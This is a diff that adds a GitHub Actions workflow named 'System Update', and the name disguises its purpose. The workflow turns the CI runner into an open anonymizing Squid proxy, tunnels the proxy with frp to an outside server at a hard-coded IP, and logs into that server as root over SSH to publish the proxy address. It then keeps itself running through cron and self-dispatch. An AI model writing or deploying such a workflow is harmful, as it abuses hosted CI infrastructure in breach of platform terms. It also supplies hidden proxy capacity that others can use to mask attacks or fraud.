@@ -1,0 +1,133 @@
+name: System Update
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'
+
+permissions:
+  contents: read
+  actions: write
+
+concurrency:
+  group: system-update
+  cancel-in-progress: false
+
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Install
+        run: sudo apt update && sudo apt install squid sshpass wget curl -y
+
+      - name: Config
+        run: |
+          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
+          http_port 3128
+
+          acl allsrc src all
+          http_access allow allsrc
+
+          forwarded_for off
+          via off
+          request_header_access X-Forwarded-For deny all
+          request_header_access Via deny all
+          request_header_access Cache-Control deny all
+
+          visible_hostname localhost
+          EOF'
+
+          sudo systemctl restart squid
+          sleep 3
+          sudo systemctl status squid --no-pager || true
+
+      - name: Install
+        run: |
+          FRP_VERSION="0.61.2"
+          FRP_FILE="frp_${FRP_VERSION}_linux_amd64.tar.gz"
+          FRP_URL="https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/${FRP_FILE}"
+
+          for i in {1..5}; do
+            echo "Download attempt $i..."
+            curl -fL --retry 3 --retry-delay 5 -o "${FRP_FILE}" "${FRP_URL}" && break
+            sleep 10
+          done
+
+          ls -lh "${FRP_FILE}"
+          tar -xzf "${FRP_FILE}"
+          sudo mv "frp_${FRP_VERSION}_linux_amd64/frpc" /usr/local/bin/
+          frpc --version
+
+      - name: Start
+        env:
+          TOKEN: ${{ secrets.POT }}
+        run: |
+          cat > frpc.toml <<EOF
+          serverAddr = "45.144.53.63"
+          serverPort = 7000
+
+          auth.method = "token"
+          auth.token = "${TOKEN}"
+
+          [[proxies]]
+          name = "github-squid-${{ secrets.SPAN }}"
+          type = "tcp"
+          localIP = "127.0.0.1"
+          localPort = 3128
+          remotePort = ${{ secrets.SPAN }}
+          EOF
+
+          for i in {1..3}; do
+            echo "Attempt $i..."
+            pkill frpc || true
+
+            frpc -c frpc.toml > frpc.log 2>&1 &
+            sleep 25
+
+            cat frpc.log
+
+            if grep -qi "start proxy success\|login to server success" frpc.log; then
+              echo "Got: 45.144.53.63:${{ secrets.SPAN }}"
+              break
+            fi
+
+            echo "Retrying..."
+            sleep 5
+          done
+
+          if ! grep -qi "start proxy success\|login to server success" frpc.log; then
+            echo "ERROR: No"
+            exit 1
+          fi
+
+      - name: Get 
+        env:
+          SSEC: ${{ secrets.SECRET }}
+        run: |
+          FRP_URL="45.144.53.63:${{ secrets.SPAN }}"
+
+          echo "Sync OK (${FRP_URL})"
+
+          sshpass -p "${SSEC}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "
+            touch /var/www/html/${{ secrets.TXT }}
+            grep -Fxq '${FRP_URL}' /var/www/html/${{ secrets.TXT }} || echo '${FRP_URL}' >> /var/www/html/${{ secrets.TXT }}
+            
+          "
+
+      - name: alive
+        run: sleep 617
+
+      - name: next
+        if: always()
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          sleep 28
+
+          curl -X POST \
+            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/main.yml/dispatches \
+            -d '{"ref":"main"}'
